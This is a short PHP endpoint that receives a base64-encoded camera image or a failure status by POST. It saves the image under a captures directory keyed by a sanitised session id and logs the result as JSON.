<?php
header('Content-Type: text/html');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method Not Allowed');
}

$raw_sid = isset($_POST['Sid']) ? $_POST['Sid'] : 'unknown';
$sid = preg_replace('/[^a-zA-Z0-9_\-]/', '', substr($raw_sid, 0, 64));

$status = 'failed';
$error = null;

$image_data = isset($_POST['Image']) ? $_POST['Image'] : '';
$status_override = isset($_POST['Status']) ? strtolower(substr($_POST['Status'], 0, 16)) : '';
$error_override = isset($_POST['Error']) ? substr($_POST['Error'], 0, 512) : '';

if ($status_override === 'failed') {
    $status = 'failed';
    $error = $error_override ?: 'Camera reported failure';
} elseif ($image_data && preg_match('/^data:image\/(\w+);base64,/', $image_data, $matches)) {
    $img_type = $matches[1];
    $base64_str = substr($image_data, strpos($image_data, ',') + 1);
    $base64_str = str_replace(' ', '+', $base64_str);
    $decoded = base64_decode($base64_str);

    if ($decoded !== false) {
        $capture_dir = '../../db/captures';
        if (!is_dir($capture_dir)) {
            mkdir($capture_dir, 0755, true);
        }
        $file_path = $capture_dir . '/' . $sid . '.jpg';
        file_put_contents($file_path, $decoded);
        $status = 'success';
    } else {
        $error = 'Base64 decode failed';
    }
} else {
    $error = 'No image data received';
}

$data = array(
    'status' => $status,
    'sid' => $sid,
    'error' => $error
);

$json_data = json_encode($data);
$f = fopen('../../logs/' . $sid . '.camera.json', 'w+');
fwrite($f, $json_data);
fclose($f);
